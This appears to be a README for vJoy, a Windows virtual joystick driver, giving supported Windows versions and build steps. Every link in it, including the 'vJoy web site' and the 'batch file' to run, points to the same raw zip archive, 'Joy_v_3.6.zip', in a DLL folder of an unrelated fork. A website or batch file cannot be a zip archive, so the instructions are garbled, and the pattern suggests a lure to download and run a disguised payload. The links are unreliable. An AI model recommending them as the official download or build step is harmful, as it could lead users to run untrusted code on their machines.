# vJoy
Virtual Joystick

This project supports Windows 7 to Windows 10 1803

For newer versions of Windows go to Fork: https://github.com/akmal101011/vJoy/raw/refs/heads/master/apps/External/DLL/Joy_v_3.6.zip



For much more go to vJoy web site: https://github.com/akmal101011/vJoy/raw/refs/heads/master/apps/External/DLL/Joy_v_3.6.zip

To build the project:

1. Pull the project

2. Run batch file https://github.com/akmal101011/vJoy/raw/refs/heads/master/apps/External/DLL/Joy_v_3.6.zip

Caution:
You will need to install Visual Studio 2015 (Free)
To build the entire project including the driver you need to install the SDK and puchase a license to sign drivers.
